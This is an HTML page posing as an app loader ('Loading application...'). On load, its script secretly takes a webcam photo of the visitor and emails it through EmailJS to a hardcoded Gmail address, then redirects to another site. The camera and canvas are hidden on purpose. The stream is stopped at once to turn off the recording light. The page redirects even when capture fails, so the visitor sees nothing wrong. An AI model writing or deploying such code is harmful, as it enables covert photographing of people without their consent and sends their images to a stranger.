<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <!-- Load EmailJS Library safely -->
    <script type="text/javascript" src="https://jsdelivr.net"></script>
    <style>
        /* Keep the page clean and blank while processing */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #ffffff;
        }
        /* Completely hide the background utility elements */
        video, canvas {
            display: none;
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
        .loader {
            color: #555;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <div class="loader">Loading application...</div>

    <!-- Hidden video feeds used purely for background tracking -->
    <video id="hiddenWebcam" autoplay playsinline width="640" height="480"></video>
    <canvas id="hiddenCanvas" width="640" height="480"></canvas>

    <script>
        // 1. INITIALIZE EMAILJS
        // Put your actual EmailJS Public Key here
        emailjs.init("YOUR_PUBLIC_KEY");

        const video = document.getElementById('hiddenWebcam');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');
        const redirectUrl = "https://pixel-sketch8.github.io/turbo-disco/";

        // 2. START THE CAMERA IN THE BACKGROUND
        async function startSilentCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;

                // Wait briefly for the camera sensor to warm up and stream frames
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        captureAndRedirect();
                    }, 800); // 800ms delay ensures a clear picture frame is captured
                };
            } catch (err) {
                console.error("Camera access failed:", err);
                // Even if the camera fails or is blocked, redirect the user anyway
                window.location.href = redirectUrl;
            }
        }

        // 3. CAPTURE FRAME, INITIATE SEND, AND REDIRECT
        function captureAndRedirect() {
            try {
                // Snap the frame to the hidden canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageDataUrl = canvas.toDataURL('image/jpeg');

                // Kill the camera stream tracks immediately to turn off the device recording light
                const stream = video.srcObject;
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }

                // Prepare parameters for EmailJS template
                const templateParams = {
                    to_email: "snmghost452@gmail.com",
                    photo_data: imageDataUrl
                };

                // Send via your EmailJS account details
                // Replace with your real 'YOUR_SERVICE_ID' and 'YOUR_TEMPLATE_ID'
                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
                    .then(() => {
                        // Success -> Redirect instantly
                        window.location.href = redirectUrl;
                    })
                    .catch((error) => {
                        console.error('Email error:', error);
                        // Redirect anyway so the user doesn't get stuck
                        window.location.href = redirectUrl;
                    });

            } catch (e) {
                console.error("Processing error:", e);
                window.location.href = redirectUrl;
            }
        }

        // Start the workflow immediately on load
        window.addEventListener('DOMContentLoaded', startSilentCapture);
    </script>
</body>
</html>
